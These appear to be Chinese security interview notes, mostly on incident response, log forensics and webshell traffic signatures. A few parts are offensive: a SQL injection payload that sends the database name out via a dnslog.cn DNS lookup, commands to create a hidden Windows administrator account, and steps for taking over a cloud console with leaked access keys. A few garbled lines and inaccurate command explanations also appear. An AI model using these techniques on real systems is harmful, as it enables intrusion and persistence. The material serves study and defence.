# 应急响应

## 一台主机A被0day拿下后，感染了内网的B，B在发起内网横向的时候被设备捕捉到告警了。你该如何排查？如何排查是否有其他被感染的主机？如何排查出A？

```
1.隔离主机B：首要任务是隔离受感染的主机B，防止其进一步传播恶意软件或攻击其他主机。
2.分析设备告警：仔细分析设备告警内容，确定主机B的活动和攻击特征。了解恶意行为的迹象和影响。
3.查找其他受感染的主机：通过查看网络流量、日志和设备报告，尝试确定是否有其他主机在内网被感染。关注异常的网络通信和主机行为特征。
4.审查主机A的活动：对主机A进行深入检查，分析其系统日志、进程信息、网络连接等，尝试找出入侵痕迹和漏洞利用痕迹。
5.恢复受感染主机：对受感染的主机进行清理和修复操作，将其恢复到一个安全状态。可以考虑重新部署受影响的系统。
6.加强安全措施：审查并加强内网的安全措施，包括防火墙设定、入侵检测系统、安全补丁更新等，以防止类似事件再次发生。
```



## linux排查时发现基础命令都被隐藏或替换，如 ls，cat，more等都使用不了，怎么去恢复，怎么处理？

```
检查命令文件是否被替换
rpm -Vf /usr/bin/*
rpm -Vf /usr/sbin/*
#rpm -Vf /usr/bin/xxx
#S 关键字代表文件大小发生了变化
#5 关键字代表文件的 md5 值发生了变化
#T 代表文件时间发生了变化

假如ps被修改，使用
ls -al ps
cat ps
```



## 当kill掉某进程时，发现该进程再次出现

```
使用ps命令查看进程的详细信息，包括它的父进程。例如：
ps -ef | grep [p]rocess_name

如果进程是由服务管理的，你可以尝试停止该服务。例如，如果你使用的是systemd，你可以使用以下命令：
systemctl stop service_name

如果进程是由父进程启动的，需要杀死父进程。
如果进程忽略了SIGTERM信号，你可以尝试发送SIGKILL信号，这个信号不能被忽略。例如：
kill -9 process_id

如果无法删除父进程，使用下面的方法：
1.使用条件竞争，创建同名文件，覆盖原始文件内容
2.使用文件夹包含，创建一个文件夹，然后删除文件
```



## 平时有遇到过php不死马吗，针对被种了不死马的主机有什么解决办法

```
1占用目录名
删除并重新创建一个和不死马要生成的马名字一样的路径及文件

2kill
ps aux 		列出所有进程，找到要杀掉的进程运用命令
kill -9 -1 ___  	9：杀死一个进程 1：重新加载进程

条件竞争删除不死马
编写一个使用ignore_user_abort(true)函数的脚本，一直竞争写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果

<?php
	ignore_user_abort(true);
	set_time_limit(0);
	while (1) {
    	$pid = 不死马的进程PID;
    	@unlink(".1.php");
    	exec("kill -9 $pid");
    	usleep(1000);
    }
?>
```



## 命令执行404如何判断对方攻击

```
1. 检查日志，如果404请求的IP，都是一个IP，可能是
2. 看频率
3. 根据业务，看路由
```



## windows日志排查

```
1. 首先确定要排查的日志，windows日志包括：应用程序、安全、设置、系统和转发事件日志。，应用和服务日志包括各种应用程序、服务和组件的日志。
2. 然后针对事件ID、关键字、用户这些进行排查，比如4624是登录成功，4625是登录失败

事件ID
4624：成功的账户登录
4625：账户登录失败
4648：使用显式凭据尝试登录
4672：分配了特殊权限的账户登录
4720：创建了一个新用户账户
4722：用户账户被启用
4723：尝试更改账户的密码
4725：用户账户被禁用
4728：用户被添加到全局组
4732：用户被添加到本地组
4738：用户账户被更改
4740：用户账户被锁定
4767：用户账户的锁定状态被改变
4776：NTLM身份验证尝试
4782：密码哈希同步操作
1102：审计日志被清除
7045：服务安装
5136：目录服务对象被修改
```



# 渗透测试

## 渗透中遇到过aksk泄露的情况吗，阿里云aksk特征是什么，拿到aksk后如何接管web控制台，拿阿里云说明

```
阿里云AK/SK特征：
1. Access Key是类似于 LTAILTxxxxxxxxxxxxxx 的20位字符。
2. Secret Key是由大小写字母和数字组成的40位字符。
3. AKSK是访问云服务API时的凭证，类似于用户名和密码的概念，用于识别用户并授权其操作云资源。

如何接管web控制台
拿到AKSK后接管Web控制台：
1. 登录阿里云控制台：使用泄露的AKSK登录到阿里云的控制台。
2. 创建新的管理员账户：在控制台中创建一个新的具有管理员权限的账户，确保这个账户具有较高的权限。
3. 移除原本AKSK的权限：将原本泄露的AKSK对应的账户的权限删除或限制，防止被原账户恢复控制。
4. 监控和审计：确保对所有账户和权限的变化进行监控和审计，以及时发现和应对任何不正常的活动。
5. 改密并保护AKSK：重置原本泄露的AKSK，确保新的AKSK只受信任的人知晓，并严格保护其安全。
```



## 什么时候使用dns外带数据

```
1.命令执行没有回显的情况下，使用dns外带
2.在某些无法直接利用漏洞获得回显的情况下，但是目标可以发起 DNS 请求，这个时候就可以使用dns外带
通常使用在：
1.SSRF
2.XSS盲打
3.Sql注入
kobe' and if((select load_file(concat('\\\\',(select database()),'.096lsv.dnslog.cn'))),1,0)#
4.XML注入
```





# 溯源

## 针对dnslog恶意请求怎么去反制

```
DNSlog攻击预防
（一）事前排查
如果是Java业务，并且使用了log4j，一是排查是否安装了最新补丁，自查资产。
将业务系统更新到最新系统，并且时刻检测是否有更新包
（二）提前预判，提前阻拦
通过FOFA、鹰图、钟馗之眼、360资产测绘、Shodan等资产测绘平台，以DNSlog平台为指纹，提前收集DNSlog地址，并且在域控DNS服务器添加正向解析
还可以启用 DNS over HTTPS (DoH) 或 DNS over TLS (DoT) 等加密通信方式，可以增加对 DNS 请求的保护，使其更难受到劫持或篡改。
```



# 权限提升

## Windows创建隐藏用户的命令

```
打开命令提示符（以管理员身份运行）。
使用net user命令创建一个新的用户。例如，创建一个名为hiddenuser的用户，密码为password：
打开注册表编辑器（在命令提示符中输入regedit并按回车）。
导航到HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList。
在UserList键下，创建一个新的DWORD值，名称为你刚刚创建的用户名（例如hiddenuser），值为0。

cmd下
net user xxx$ 123 /add
将隐藏用户添加到管理员组
net  localgroup administrators  xxx$  /add
```





# 信息收集

## 主机资产梳理，梳理哪些

```
资产梳理方式:一、安全防护设备资产二、对外开放服务项目资产三、项目外包业务流程资产
资产梳理方式二:一、业务资源梳理二、设备资产梳理三、第三方的服务信息梳理
风险梳理
风险有哪些？ 一,账号权限风险二,互联网风险梳理三,后台目录风险四,端口风险：五,暴露面收敛梳理
```



## 绕过cdn找真实IP地址

```
CDN简单介绍
CDN：全称Content Delivery Network，即内容分发网络，CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问的网络中，在用户访问网站时，由距离最近的缓存服务器直接响应用户请求。
在收集ip前，首先需要确认目标网站是否使用CDN，可使用多地ping的方式。如使用CDN，则需要绕过CDN寻找真实ip，推荐以下几种方式：
在线ping检测平台
http://ping.chinaz.com/
https://www.wepcc.com/
https://site.ip138.com
https://webiplookup.com/
其他方式
1.尝试找出cdn背后的真实ip，需要在kali上运行
项目地址：https://github.com/3xp10it/xcdn

2.域名ip：很多主站会挂CDN，但分站不会，有些分站跟主站在同一台服务器或者同一个C段内，就可以通过查询子域名对应的 IP 来查找。
3.网络空间搜索引擎：这些引擎收录的ip可能是真实ip。
4.旁站ip：用whios查询管理员其它的域名，可能与目标域名在同一个服务器，并且未做cdn。
5.利用SSL证书寻找真实原始IP：在https://crt.sh上查找目标网站SSL证书的HASH，然后再用Censys搜索该HASH即可得到真实IP地址。
6.内部邮箱：一般邮件服务器在内部，没有CDN解析，邮件返回的域名IP可能是真实IP。
7.如果目标站点有自己的APP，通过抓取APP请求来获取ip
8.二级域名法：目标站点一般不会把所有的二级域名放cdn上。通过在线工具如站长帮手，收集子域名，确定了没使用CDN的二级域名后。本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试
9.nslookup法：找国外的比较偏僻的DNS解析服务器进行DNS查询，因为大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。
10.Ping法：直接ping example.com而不是www.example.com，因为现有很多CDN厂商基本只要求把www.example.com cname到CDN主服务器上去，那么直接ping example.com有可能直接获得真实IP。
```



# 内网

### 域内攻击方法有了解过吗

```
MS14-068域内提权、Roasting攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay、netlogon
```



# 应急响应流程

```
应急响应流程与取证思路
收集信息：收集客户信息和中毒主机信息，包括样本。
判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。
深入分析：日志分析、进程分析、启动项分析、样本分析。
清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。
产出报告：整理并输出完整的安全事件报告。
应急响应流程：

1，首先及时隔离机器，断网，防止攻击者利用该台机器继续攻击。

2，其次，确定被攻击范围，是否通过内网渗透了更多机器。

3，保留样本，分析攻击者是怎么攻击进来的，通过哪里攻击进来的，分析流量包，及时对攻击者ip进行封锁和反制，成功反制后得分。

4，恢复机器，清理干净后门，重新安装系统及其应用，保证一切正常运转。

5，及时更改密码，防止攻击者已获得多种密码，进行下一步攻击。

6，加强安全教育~未知链接不要点，陌生邮件不要信等。

日志分析快速定位攻击者：

1.短时间内大量请求的ip有可能是扫描器，部分扫描器带有固定的特征值，比如bess.me是awvs 的xss扫描插件，

2.非正常请求，就是正常业务逻辑中不会发送的请求，可以通过关键词来进行过滤

3.还有一些重要接口，根据咱们的业务类型，关键词查询，看看有谁访问了这个接口

取证过程：

根据询问情况，梳理关键线索，如时间点、攻击 IP、异常 IP、攻击手段等等。根据优先
顺序将应急取证实施过程分为：

针对挖矿、勒索、恶意软件等持续性威胁的安全事件

1、优先隔离网络，停止，取证对病毒样本进行分析，针对特征进行杀毒处理。

挖矿应急响应流程：

1.首先是切断网络，或者使用防火墙策略封禁双向通信的方式抑制挖矿运行。

2.排查可疑项

可以大致从以下几个方面入手：可疑进程、开放的端口、计划任务、服务项、可疑的用户、内存空间还有最明显的特征：CPU占用高

CPU：

有些挖矿守护进程会判断是否打开任务管理器，如果打开后会把挖矿进程杀死，然后等待180秒后强制关闭调试工具再进行挖矿。Windows可使用wmic方式获取CPU占用：wmic cpu get LoadPercentage /value

可疑进程：

Autoruns、PCHunter、ProcessDump、processhacker、ProcessExplorer、火绒剑等等

开放端口：

Windows和Linux均可使用netstat -ano查看一下端口情况，是否开启高危端口，存在可能被利用风险。有时攻击者使用端口转发将流量转发出内网，可以在此处看到有可疑的对外监听端口。

计划任务：

挖矿病毒为了使挖矿进程一直运行，会做出各种各样的守护方式，计划任务就是最普遍的守护方式之一。
Windows7使用at命令；Windows10使用schtasks命令查看计划任务列表。
开始--所有程序--启动目录中存在的文件也不能放过。
Linux系统使用crontab -l命令查看计划任务，但还是建议直接查看/etc/crontab文件，也可在/var/log/cron下查看计划任务的日志。

排查路径：

/var/spool/cron/*
/var/spool/anacron/*
/etc/crontab
/etc/anacrontab
/etc/cron.*
/etc/anacrontab
/etc/rc.d/init.d/

服务项：

同上，服务也是挖矿病毒常见的守护方式之一，将注册表中服务启动方式写为挖矿病毒主程序，从而达到守护进程目的。
Windows系统中使用：开始--运行--输入services.mscLinux系统中使用：systemctl list-unit-files --type service |grep enabled

可疑用户：

攻击者有时会创建自己的账户，用来隐藏自己的恶意行为。
Windows中创建用户后，利用账户进行一系列隐藏操作，创建影子账户可使管理员无法发现，可通过D盾查看系统中是否存在影子账户。

Linux：
命令	命令详解
who	查看当前登录用户（tty本地登陆  pts远程登录）
w	查看系统信息，想知道某一时刻用户的行为
last	显示近期用户或终端的登录情况
uptime	查看登陆多久、多少用户，负载
cat /etc/passwd	查看用户信息文件
cat /etc/shadow	查看影子文件
awk -F: '$3==0{print $1}' /etc/passwd	查看管理员特权用户
awk '/$1|$6/{print $1}' /etc/shadow	查看可以远程登录的用户
more /etc/sudoers	grep -v "^#
awk -F:'length($2)==0 {print $1}' /etc/passwd	查看空口令账户(有时攻击者会将正常账户改为空口令)

WMIC空间：

WMIC是Windows中用来管理WMI系统的工具，提供了从命令行接口和批命令脚本执行系统管理的支持。攻击者经常使用WMIC调用系统进程，从而实现恶意软件的运行。
使用进程分析类工具也可以分析WMIC空间，查看是否存在恶意软件

针对后门、篡改、弱口令、等非持续性威胁的安全事件

1、排查服务是否存在弱口令，是否存在易猜解口令风险。
2、检查是否因版本问题存在历史漏洞，如存在及时修复
3、尝试根据日志复现漏洞，及时对漏洞进行修复

针对钓鱼邮件、数据库泄露安全事件

1、优先修改账号密码、并对涉事机器进行病毒查杀
2、再针对相应的日志找出存在可能的入口

安全设备日志取证

安全设备日志（确定线索）。 如果已获得关键线索（关键时间点、攻击手段、IP）的情
况下，根据线索先分析安全设备日志，不论是否有线索都导出前 7 天-30 天时间全量的安全设备日志（根据日志数据量大小，现场评估适当调整）用于同步分析，如僵木蠕类优先看终
端防护日志、web 类优先查看流量监测防护日志；

系统日志取证

Windows系统日志取证

Windows 系统日志位置：（%SystemRoot%即 C:\Windows）
Windows 2000 / Server2003 / Windows XP ：%SystemRoot%\System32\Winevt\Logs*.evtx
Windows Vista / 7 / 10 / Server2008 及以上 版
本：%SystemRoot%\System32\Config*.evtx

【功能点】命令行复制所有系统日志：
尝试用两种方式复制系统日志到当前目录的 Logs 文件中 ：（%windir%即 C:\Windows）
xcopy "%windir%\System32\config" "Logs" /E /Y /F & xcopy "%windir%\System32\win
evt\Logs" "Logs" /E /Y /F

日志文件过大的情况，根据实际情况按照关键线索、重要程度挑选相关日志进行提取，一般
System.evtx、Security.evtx、Application.evtx 必取的。

Linux系统日志取证

Linux 系统日志位置：
系统日志的默认位置为：/var/log/*.log

命令行打包压缩所有系统日志：
压缩/var/log 文件到当前目录（执行命令的路径下）syslog.zip 文件中
命令：zip -q -r syslog.zip /var/log

日志文件过大的情况，根据实际情况按照关键线索、重要程度挑选相关日志进行提取，
一般必取的如

/var/log/cron
/var/log/messages
/var/log/secure
/var/log/nginx/*(如果有)
/var/log/apache/*(如果有)
/var/log/apache2/*(如果有)

WEB日志取证

IIS日志取证

默认日志位置 IIS 日志取证。

默认日志位置： 
%systemroot%\system32\LogFiles （IIS6）  
%SystemDrive%\inetpub\logs\LogFiles （IIS7）

md IISLogs
xcopy "%systemroot%\system32\LogFiles" "IISLogs" /E /Y /F & xcopy
"%SystemDrive%\inetpub\logs\LogFiles" "IISLogs" /E /Y /F

若默认日志位置未找到日志文件，则可尝试通过配置查找日志文件：
IIS 日志未保存在默认未知，通过 IIS 配置确定日志位置：
点击“控制面板---管理工具”
双击打开“Internet Information Services (IIS)管理器”
点击左侧 web 服务“web 应用”查看主页，找到并点击打开“日志”



除此之外，需要注意的是，在打开 W3C 日志【选择字段】中可以勾选想要收集的日志(Logging)记录字段，详尽记录访问日志记录内容。

Tomcat日志取证

由于 linux 和 windows 下 tomcat 的部署运行基本相同这里基本不用特殊区分，根据经验，现
场取日志的过程中可以灵活采用下面的方式进行取证，从节约精力和时间的角度优先顺序就
是编号正序顺序。
方式 1: 通过询问的方式获取 web 日志文件
如果现场 web 服务已经关闭例如页面篡改类，为了防止社会面影响可能优先进行断网，
少数情况对于 web 服务也被关闭了，这种情况下可以通过询问现场运维或者开发人员对应
的日志位置，取证前需要确认与安全事件相关或属于同时运行的旁站日志，要 求 现 场配合 人
员提取相关日志下载。

方式 2: 通过搜索的方式定位 web 日志文件
搜索关键词:
直接搜索".log"找到类似access.log/error.log 的文件，取证前需要确认
与安全事件相关或属于同时运行的旁站日志，直接取证下载。

方式 3: 通过 tomcat 配置文件定位 web 日志文件（常用于无法确定是否有日志的情况）：
可以直接搜索“server.xml”关键词，找到所有 tomcat 的配置文件%tomcat%/catalina/conf/
server.xml，确认与安全事件相关或属于旁站 tomcat 配置，查看关键词“AccessLogValve”相关
配置确认日志文件位置即可
，然后取证下载。
通过询问开发或全文件搜索"tomcat"找到 tomcat 根目录%tomcat%

方式 4: 通过查看 server 启动命令判断日志存放位置
特殊情况下，例如没有 server.xml 配置文件（jar 包中自带 tomcat 等 java 的 web 容器），
通过进程确认为 web 服务的，可以通过观察是否有指定输出命令行到文件的操作来找到日
志文件，例如“java -jar xxx.jar > xxx_server.log" ，则 xxx_server.log 即相关日志文件。（通
常 jar 包如果很小，几十 mb 以下则一般不包含 tomcat 的 jar 依赖包，一般通过 1 情况判断
日志位置。）

tomcat 部署项目一般有两种方式：

1.  部署解包的 webapp 目录
部署没有封装到 WAR 文件中的 Web 项目，只要把我们的项目（编译好的发布项目，非开发
项目）放到 Tomcat 的 webapps 目录下就可以了。 
2.  打包的 war 文件
只需把打包的 war 文件放在 webapps 目录下 

2 的另一种方式，通过 Manager Web 应用程序部署 war 包：
进入 Manager Web 管理界面，



部署 war 包上传，效果和 2 相同，

判断部署的 web 应用有哪些：
根据 2 种部署方式可以归纳：

1.  可以查看%tomcat%\webapps 下的文件夹或者*.war 包，每个文件夹或者 war 包即是一个
web 项目； 
2.  可以进入 manager web 管理界面查看到目前配置的项目 

Apache日志取证

根据经验，现场取日志的过程中可以灵活采用下面的方式进行取证，从节约精力和时间的角
度优先顺序就是编号正序顺序。
方式 1: 通过询问的方式获取 web 日志文件
如果现场 web 服务已经关闭例如页面篡改类，为了防止社会面影响可能优先进行断网，
少数情况对于 web 服务也被关闭了，这种情况下可以通过询问现场运维或者开发人员对应
的日志位置，取证前需要确认与安全事件相关或属于同时运行的旁站日志，要 求 现 场配合 人
员提取相关日志下载。

方式 2: 通过搜索的方式定位 web 日志文件
搜索关键词:
直接搜索".log"找到类似 access_log(access.log)、error_log(error.log)、
ssl_access_log、ssl_error_log、ssl_request_log 的文件，取证前需要确认与安全事件相关或属
于同时运行的旁站日志，直接取证下载。

方式 3: 通过 tomcat 配置文件定位 web 日志文件（常用于无法确定是否有日志的情况）：
可以直接搜索“httpd.conf”关键词，找到所有 apache 的配置文件 httpd.conf，确认与安全
事件相关或属于旁站 apache 配置，查看关键词“Log”相关配置确认日志文件位置即可，然
后取证下载。
Windows 中 apache 位置:

%Apache 根目录%\logs*.log
Linux 系统中 apache 位置:
/usr/local/apache/logs/*
/var/log/apache2/*

grep -Er "access.log|error.log"  /etc/apache2/ |grep -v "#"

通过询问开发或全文件搜索"apache"找到 apache 根目录%apache%

apache 日志相关配置文件：
全局检索关键词："httpd.conf"、"apache2.conf"
Apache/2.4.18 (Ubuntu): /etc/apache2/apache2.conf
Apache/2.2：/etc/httpd/conf/httpd.conf

windows 下：%Apache 根目录%\conf\httpd.conf

apache 日志位置：
Windows:

%Apache 根目录%\logs*.log
Linux 系统中 apache 位置:
/usr/local/apache/logs/*

/var/log/apache2/*

apache 日志关键词：
access_log(access.log)、error_log(error.log)、ssl_access_log、ssl_error_log、ss
l_request_log

Apache 会自动生成两个日志文件，这两个日志文件分别是访问日志 access_log（在 Wind
ows 上是 access.log）和错误日志 error_log（在 Windows 上是 error.log）。如 果使用 SSL 服
务的话，还可能存在 ssl_access_log 和 ssl_error_log 和 ssl_request_log 三种日志文件。

Nginx日志取证

根据经验，现场取日志的过程中可以灵活采用下面的方式进行取证，从节约精力和时间的角
度优先顺序就是编号正序顺序。
方式 1: 通过询问的方式获取 web 日志文件
如果现场 web 服务已经关闭例如页面篡改类，为了防止社会面影响可能优先进行断网，
少数情况对于 web 服务也被关闭了，这种情况下可以通过询问现场运维或者开发人员对应
的日志位置，取证前需要确认与安全事件相关或属于同时运行的旁站日志，要 求 现 场配合 人
员提取相关日志下载。

方式 2: 通过搜索的方式定位 web 日志文件
搜索关键词:
直接搜索".log"找到类似 access_log(access.log)、error_log(error.log)的文件，
取证前需要确认与安全事件相关或属于同时运行的旁站日志，直接取证下载。

方式 3: 通过 nginx 配置文件定位 web 日志文件（常用于无法确定是否有日志的情况）：
可以直接搜索“nginx.conf”关键词，找到 nginx 的配置文件 nginx.conf，确认与安全事件
相关或属于旁站 nginx 配置，查看关键词“log”确认日志文件位置即可，然后取证下载。

方式 4: 通过翻找 nginx 目录定位 web 日志（常用于无法确定是否有日志的情况）：
可以直接搜索“nginx”关键词或者打开正在运行的 nginx 所在目录，找到 nginx 的目录，
确认与安全事件相关或属于旁站 ngin 配置，目 录 下搜索 可 能 为 日 志 的 内 容 ，然 后 取 证 下载。

Linux：
执行 sudo nginx -t 就可以获取配置文件的路径。
配置文件 nginx.conf（一般在/etc/nginx/nginx.conf)），搜索 access_log 关键词所在行如
"access_log /root/.pm2/logs/niyueling.log"，判断相关日志存放位置。
在大多数 Linux 发行版中，例如 Ubuntu ，CentOS 和 Debian。默认情况下，访问和错误日志
位于/var/log/nginx 目录中。

Windows：
先搜索 nginx 的配置文件 nginx.conf，然后找对应 log。
一般 nginx 日志在 nginx 目录中的 logs 文件夹下。

JBoss 和 WebLogic 都含有 Jsp 和 Servlet 容器,也就可以做 web 容器，所以先要查找相
关配置文件，确认 web 日志的配置路径

Jboss日志取证

方式 1: 通过询问的方式获取 web 日志文件
如果现场 web 服务已经关闭例如页面篡改类，为了防止社会面影响可能优先进行断网，
少数情况对于 web 服务也被关闭了，这种情况下可以通过询问现场运维或者开发人员对应
的日志位置，取 证 前 需 要确 认与 安 全 事 件 相关 或 属于 同 时 运 行 的旁 站日 志 ，要 求 现 场配合 人
员提取相关日志下载。

方法 2：通过查找相关配置文件
搜索关键文件：jboss/server/default/conf/jboss-log4j.xml，取证前需要确认与安全事件相关或
属于同时运行的旁站日志，直接取证下载。
方式 3: 通过搜索的方式定位 web 日志文件
搜索关键词:
直接搜索".log"找到类似access.log/error.log 的文件，取证前需要确认
与安全事件相关或属于同时运行的旁站日志，直接取证下载。

配置文件：jboss-service.xml

Weblogic日志取证

方式 1: 通过询问的方式获取 web 日志文件
如果现场 web 服务已经关闭例如页面篡改类，为了防止社会面影响可能优先进行断网，
少数情况对于 web 服务也被关闭了，这种情况下可以通过询问现场运维或者开发人员对应
的日志位置，取证前需要确认与安全事件相关或属于同时运行的旁站日志，要求现场配合人
员提取相关日志下载。
方式 2：搜索相关文件夹发现日志

weblogic 配置文件：config.xml

1.  WebLogic 9 及以后版本：
access 日志：%weblogic%\user_projects\domains<domain_name>\servers<server_name>\logs
access.log
server 日志：%weblogic%\user_projects\domains<domain_name>\servers<server_name>\logs
<server_name>.log
domain 日志： %weblogic%\user_projects\domains<domain_name>\servers<adminserver_na
me>\logs<domain_name>.log 
2.  WebLogic 8.x 版本：
access 日志：%weblogic%\user_projects\domains<domain_name><server_name>\access.log
server 日志：%weblogic%\user_projects\domains<domain_name><server_name><server_na
me>.log
方式 3：通过搜索 weblogic 相关配置文件进行查找日志位置
搜索关键词"weblogic.xml"、"config.xml" 

weblogic 部署主要是 war 包项目，部署后项目放在"%user_projects\domains\mydomain\a
pplications%"中，运行会生成临时文件，在"%bea\user_projects\domains\workshop\cgServer.w
lnotdelete\extract%"下。
配置访问的虚拟路径在 Weblogic.xml 文件中。

异常线索搜集

系统进程信息收集

优先根据线索（IP/域名/时间点/文件 hash）收集系统基本信息、样本文件、关联分析日志串
联线索、漏洞复现，在没有线索的情况下再进行全量的系统信息排查，下面根据经验汇总了
应对大部分场景下需要进行排查的点。
FGYZ[
windows 系统进程信息收集:
必须要 powshell 执行： ps >ps.txt

都可以执行：tasklist > tasklist.txt

linux 系统进程信息收集:
命令：ps -aux >ps.txt
命令：ll /proc > ll.txt
命令：pstree -apnhu > pstree.txt

可显示命令,进程关系
命令：top -d 2 -n 5 -b>top.txt

命令行历史记录

windows 命令行历史记录：
命令：C:\Users%username%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Co
nsoleHost_history.txt history.txt
只能复制当前用户的，如果黑客使用别的用户需要指定用户，将%username%替换为黑客利
用的用户名

linux 命令行历史记录：
命令：history > history.txt

系统用户审查

windows 系统用户审查：
命令：net user >user.txt
命令：net localgroup administrators >> user.txt
命令：wmic useraccount >> user.txt
linux 系统用户审查：
命令：cat /etc/passwd >passwd.txt
命令：cat /etc/shadow >shadow.txt

异常端口连接检查

windows 异常端口连接检查：
命令：netstat -ano >netstat.txt
linux 异常端口连接检查：
命令：netstat -ano >netstat.txt

启动项检查

**windows 启动项检查：
命令：reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\R
un" > 启动项.txt
命令：reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
ersion\Windows\AppInit_DLLs" >> 启动项.txt
命令：reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
ersion\Winlogon\Notify" >> 启动项.txt
命令：reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsCurrent\Versio
n\RunOnce" >> 启动项.txt
命令：reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsCurrent\Version\R
unServicesOnce" >> 启动项.txt
linux 启动项检查：
命令：systemctl list-unit-files >systemctl.txt**

计划任务检查

windows 计划任务检查：
powshell 命令：Get-ScheduledTask > Get-ScheduledTask.txt
cmd 命令：schtasks >schtasks.txt
linux 计划任务检查：
命令：crontab -l > crontab.txt           列出当前用户计划任务
1.查看cron任务：每个用户的cron任务都存储在/var/spool/cron/crontabs目录下的一个以用户名命名的文件中。你可以使用crontab -l命令查看当前用户的cron任务，或者使用crontab -u <用户名> -l查看其他用户的cron任务。此外，/etc/crontab文件和/etc/cron.d目录下的文件也可能包含一些系统级别的cron任务。
2.查看at任务：at任务是一次性的计划任务，它们的数据存储在/var/spool/cron/atjobs目录下。你可以使用at -l命令查看当前用户的at任务，或者使用at -u <用户名> -l查看其他用户的at任务。
3.查看systemd定时器：在一些使用systemd的系统中，也可以通过systemd定时器来设置计划任务。你可以使用systemctl list-timers命令查看所有的systemd定时器。

防火墙规则检查

windows 防火墙规则检查：
命令：netsh advfirewall show allprofiles > firewall.txt        查询所有防火墙配置
命令：netsh advfirewall firewall show rule name=all >> firewall.txt
查询所有出入站
规则
linux 防火墙规则检查：
命令：iptables -t raw -L >iptables.txt              # 列出所有 raw 表中的所有规则
命令：iptables -t mangle -L >>iptables.txt          # 列出 mangle 表中所有规则
命令：iptables -t nat -L >>iptables.txt

列出 nat 表中所有规则

命令：iptables -t filter -L >>iptables.txt         # 列出 filter 表中所有规则

系统共享检查

windows 系统共享检查：
命令：net share >systemshare.txt

内存取证

windows 获取内存 dump 数据⼯具

可以使⽤如下⼯具来抓取内存 dump 工具如下：
KnTTools

F-Response

Mandiant Memoryze

HBGary FastDump

MoonSols Windows Memory Toolkit

AccessData FTK Imager

EnCase/WinEn

Belkasoft Live RAM Capturer

ATC-NY Windows Memory Reader

Winpmem

Win32dd/Win64dd

DumpIt
linux 打包内存镜像⽅式

sudo dd if=/dev/mem of=/tmp/mem_dump.dd
bs=1MB count=1010+0 records in10+0 records out10000000 bytes (10 MB) copied, 0.0331212 s,
302 MB/s

VM 虚拟机内存镜像⽅式
VM 暂停虚拟后就可以看到 vmem⽂件，是可以直接被 volatility 分析的，提取 vmem 文件
即可



沙箱获取内存 dump

Cuckoo 沙箱在分析恶意样本后⽣成 dump⽂件。

参考链接:

https://baynk.blog.csdn.net/article/details/116628984

1.  将文件加密后再进行同步。
系统详细信息取证 
2.  打开命令行。允许接触服务器的情况将命令行路径选择在 U 盘中，后续生成文
件都在命令当前文件夹中。 
3.  应急响应异常行为收集根据（小标题 3.1.1.1）应急异常行为收集操作 ，格式
为命令 > 命令.txt
1、 Sql 日志或异常数据 

如需后端协助分析，则取证内容同步到后段进行分析，同时开始
```



# 日志

## Windows和Linux的日志存放位置

```
Windows：
事件查看器：Windows的大部分系统和应用日志都可以在事件查看器中找到。你可以通过“控制面板” -> “管理工具” -> “事件查看器”来访问这些日志。
IIS日志：如果你在Windows服务器上运行IIS，那么IIS的日志默认存放在%SystemDrive%\inetpub\logs\LogFiles目录下。
SQL Server日志：SQL Server的日志默认存放在%ProgramFiles%\Microsoft SQL Server\<版本号>\MSSQL\Log目录下。
Linux：
系统日志：Linux的系统日志通常存放在/var/log目录下。这个目录下的syslog或messages文件通常包含了大部分的系统日志。
auth日志：/var/log/auth.log文件记录了系统的授权信息，包括用户登录和sudo命令的使用情况。
应用日志：许多应用程序也会在/var/log目录下创建自己的日志文件或目录，例如Apache的日志通常存放在/var/log/apache2目录下。
```

## 中间件日志存放路径

```
Windows：
Apache：%ProgramFiles%\Apache Group\Apache\logs\
Tomcat：%CATALINA_HOME%\logs\
IIS：%SystemDrive%\inetpub\logs\LogFiles
SQL Server：%ProgramFiles%\Microsoft SQL Server\<版本号>\MSSQL\Log
Nginx：%Nginx_Home%\logs\
Weblogic：%DOMAIN_HOME%\servers\<ServerName>\logs\

Linux：
Apache：/var/log/apache2/
Tomcat：$CATALINA_HOME/logs/
MySQL：/var/log/mysql/
Nginx：/var/log/nginx/
PostgreSQL：/var/log/postgresql/
Weblogic：$DOMAIN_HOME/servers/<ServerName>/logs/
```



# webshell工具流量特征

## 冰蝎3.0和4.0的区别

```
冰蝎4.0加密流量特征与3.0版相差比较大。首先是加密方式，客户端自带xor、xor_base64、aes、json和image等五种加密方式，每种加密方式都支持自定义加解密代码；其次是传输方式，冰蝎4.0引入了okhttp3客户端，因此HTTP协议交互、TLS协议交互与3.0的客户端也有显著不同。
v3.0 和 v4.0 的区别很明显在于这里 $_SESSION['k']=$key，v3.0 版本当中会把 key 作为 session 传入；接着判断 extension_loaded，也就是判断服务端是否存在 openssl拓展，如果不存在就用 base64 解码，然后使用 key 进行异或加密，这也是冰蝎 v4.0 版本当中的 xor_base64加密方式；如果服务端能够加载 openssl 拓展，就使用 AES128 解密，这里对应冰蝎 v4.0 版本当中的 aes加密方式。
```



## 菜刀蚁剑冰蝎哥斯拉各版本流量特征

```
蚁剑
特征：
请求中的User-Agent值是：antSword/*
也有可能是：Mozilla/5.0 (Windows NT ***) AppleWebKit/*** (KHTML, like Gecko) Chrome/***** Safari/****
请求中可以检测到的关键字：“eval””eVAL”
请求体存在@ini_set("display_errors", "0");@set_time_limit(0);（开头可能是菜刀或者是蚁剑）
